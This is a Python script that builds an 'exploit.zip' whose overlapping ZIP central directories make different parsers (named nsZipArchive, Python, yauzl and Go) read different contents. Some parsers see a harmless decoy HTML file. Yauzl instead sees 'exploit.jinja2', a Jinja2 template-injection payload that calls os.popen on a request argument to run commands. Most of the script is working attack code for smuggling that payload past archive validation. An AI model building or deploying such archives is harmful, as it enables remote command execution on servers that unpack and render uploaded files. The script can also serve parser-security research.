import binascii
import struct
import sys


def r(x):
    if isinstance(x, Deferred):
        return x.resolve()
    else:
        return x

class Deferred(object):
    def __init__(self, resolve):
        self.cached = False
        self.cached_val = None
        self.base_resolve = resolve
    def resolve(self):
        if not self.cached:
            self.cached_val = r(self.base_resolve())
            self.cached = True
        return self.cached_val
    def __add__(self, other):
        return Deferred(lambda: r(self) + r(other))
    def __radd__(self, other):
        return other.__add__(self)
    def __sub__(self, other):
        return Deferred(lambda: r(self) - r(other))
    def __rsub__(self, other):
        return other.__sub__(self)


class Node(object):
    def __init__(self):
        self.prev = None
        
        self.offset = Deferred(lambda: self.prev.offset + self.prev.size)
        
        self.end = Deferred(lambda: self.offset + self.size)


class BOF(Node):
    def __init__(self):
        Node.__init__(self)
        self.offset = 0
        self.size = 0
    def write(self, f):
        pass

class Blob(Node):
    def __init__(self, data):
        Node.__init__(self)
        self.data = data
        self.size = len(self.data)
    def write(self, f):
        f.write(self.data)

class LocalFile(Node):
    @staticmethod
    def from_file(filename, local_filename):
        with open(local_filename, "rb") as f:
            return LocalFile(filename, f.read())
    def __init__(self, filename, data):
        Node.__init__(self)
        self.filename = filename
        self.data = data
        self.size = 30 + len(self.filename) + len(self.data)
    def write(self, f):
        header = struct.pack("<LHHHHHLLLHH",
            0x04034b50, 
            20,         
            0,          
            0,          
            0,          
            0,          
            self.crc(), 
            len(self.data), 
            len(self.data), 
            len(self.filename), 
            0,          
        )
        f.write(header)
        f.write(self.filename.encode())
        f.write(self.data.encode())
    def crc(self):
        return binascii.crc32(self.data.encode()) & 0xffffffff

class CentralDirectoryHeader(Node):
    def __init__(self, local_file):
        Node.__init__(self)
        self.local_file = local_file
        
        self.local_file_offset = local_file.offset
        self.size = 46 + len(self.local_file.filename)
    def write(self, f):
        header = struct.pack("<LHHHHHHLLLHHHHHLL",
            0x02014b50, 
            20,         
            0,          
            0,          
            0,          
            0,          
            0,          
            self.local_file.crc(),  
            len(self.local_file.data),  
            len(self.local_file.data),  
            len(self.local_file.filename),  
            0,          
            0,          
            0,          
            0,          
            0,          
            r(self.local_file_offset),  
        )
        f.write(header)
        f.write(self.local_file.filename.encode())


class CentralDirectory(Node):
    def __init__(self, local_files):
        Node.__init__(self)
        self.records = [CentralDirectoryHeader(f) for f in local_files]
        if self.records:
            self.records[0].prev = self
            self.records[0].offset = self.offset 
    @property
    def size(self):
        return sum(record.size for record in self.records)
    @property
    def num_records(self):
        return len(self.records)
    def write(self, f):
        link_up(self.records)
        for record in self.records:
            record.write(f)

class EndOfCentralDirectoryHeader(Node):
    def __init__(self, cd_num_records, cd_offset, cd_size, comment_len=0):
        Node.__init__(self)
        self.cd_num_records = cd_num_records
        self.cd_offset = cd_offset
        self.cd_size = cd_size
        self.comment_len = comment_len
    @property
    def size(self):
        return 22 + self.comment_len
    def write(self, f):
        header = struct.pack("<LHHHHLLH",
            0x06054b50, 
            0,          
            0,          
            r(self.cd_num_records) & 0xffff,    
            r(self.cd_num_records) & 0xffff,    
            r(self.cd_size),    
            r(self.cd_offset),  
            self.comment_len,   
        )
        f.write(header)

def link_up(a):
    for i in range(1, len(a)):
        a[i].prev = a[i-1]

decoy_files = [
    LocalFile("fake.html", """\
<html>
<head>
<meta charset=utf-8>
</head>
<body>
<p>hi</p>
</body>
</html>
"""),
]

nsZipArchive_cd = CentralDirectory(decoy_files)
python_cd = CentralDirectory(decoy_files)

yauzl_files = [
    LocalFile("exploit.jinja2", """\
            {{ self.__init__.__globals__.__builtins__.__import__('os').popen(request.args.cmd).read() }}
        """),
]
yauzl_cd = CentralDirectory(yauzl_files)

padding_file = LocalFile("META-INF/manifest.mf", "")

go_files = []
go_cd = CentralDirectory(go_files + [padding_file] * ((65536-len(go_files)) % 65536))
assert go_cd.num_records % 65536 == 0

eocd = EndOfCentralDirectoryHeader(yauzl_cd.num_records, yauzl_cd.offset, python_cd.size)

for record in python_cd.records:
    record.local_file_offset -= eocd.offset - eocd.cd_size - eocd.cd_offset

chunks = []
chunks.append(BOF())
chunks.append(Blob(b">:-D"))
chunks.append(nsZipArchive_cd)

chunks.append(Blob(b"PK\x05\x06"))
chunks.extend(yauzl_files)
chunks.extend(go_files)
chunks.append(padding_file)
chunks.append(yauzl_cd)
chunks.append(go_cd)
chunks.extend(decoy_files)
chunks.append(python_cd)
chunks.append(eocd)

link_up(chunks)

for x in chunks:
    r(x.offset)

output = open("exploit.zip","wb")

for x in chunks:
    x.write(output)
